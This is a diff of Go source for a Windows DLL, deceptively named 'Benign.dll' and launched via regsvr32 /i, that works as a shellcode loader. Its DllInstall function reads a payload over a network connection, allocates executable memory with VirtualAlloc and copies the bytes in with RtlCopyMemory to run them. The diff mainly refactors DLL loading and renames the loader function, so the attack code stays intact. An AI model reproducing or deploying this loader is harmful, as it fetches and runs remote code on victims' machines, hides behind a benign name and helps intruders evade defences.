@@ -1,13 +1,19 @@
+//go:build windows
+// +build windows
+
 package main
 
 // PS C:\> regsvr32.exe /i Benign.dll
 
+import "C"
 import (
         "fmt"
         "io/ioutil"
         "net"
         "syscall"
         "unsafe"
+
+        "golang.org/x/sys/windows"
 )
 
 const (
@@ -17,10 +23,10 @@ const (
 )
 
 var (
-        kernel32      = syscall.MustLoadDLL("kernel32.dll")
-        ntdll         = syscall.MustLoadDLL("ntdll.dll")
-        VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
-        RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
+        kernel32      = windows.NewLazySystemDLL("kernel32.dll")
+        ntdll         = windows.NewLazySystemDLL("ntdll.dll")
+        VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
+        RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
 )
 
 //export EntryPoint
@@ -50,11 +56,11 @@ func DllInstall() bool {
         }
 
         sc, _ = ioutil.ReadAll(conn)
-        shellCodeRTLCopyMemory(sc)
+        ShellCodeRTLCopyMemory(sc)
         return true
 }
 
-func shellCodeRTLCopyMemory(shellcode []byte) {
+func ShellCodeRTLCopyMemory(shellcode []byte) {
         addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
         if addr == 0 {
                 fmt.Println(err.Error())
